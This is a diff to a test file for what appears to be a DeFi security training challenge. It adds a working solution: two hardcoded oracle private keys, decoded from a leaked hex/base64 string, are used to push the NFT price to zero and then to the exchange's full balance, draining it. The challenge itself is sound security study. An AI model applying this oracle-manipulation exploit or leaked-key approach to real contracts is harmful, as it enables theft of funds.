@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +53,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +81,29 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        bytes32 pvtkey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        bytes32 pvtkey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1 = vm.addr(uint256(pvtkey1));
+        address source2 = vm.addr(uint256(pvtkey2));
+        string memory symbol = "DVNFT";
+        vm.prank(source1);
+        oracle.postPrice(symbol, 0);
+        vm.prank(source2);
+        oracle.postPrice(symbol, 0);
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank(source1);
+        oracle.postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(source2);
+        oracle.postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        vm.stopPrank();
     }
 
     /**
@@ -95,3 +123,16 @@ contract CompromisedChallenge is Test {
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
+
+//////////////PYTHON SCRIPT FOR CONVERTING hex → ascii → base64 → private key///////////////
+/*
+import base64
+
+s = "4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130"  # same as "4d 48 67 33 5a 44 45 31" without spaces
+ascii_text = bytes.fromhex(s).decode()
+print(ascii_text)                  # MHg3ZDE1
+print(base64.b64decode(ascii_text).decode())   # 0x7d15
+*/
+
+// pvt key1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+// pvt key2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
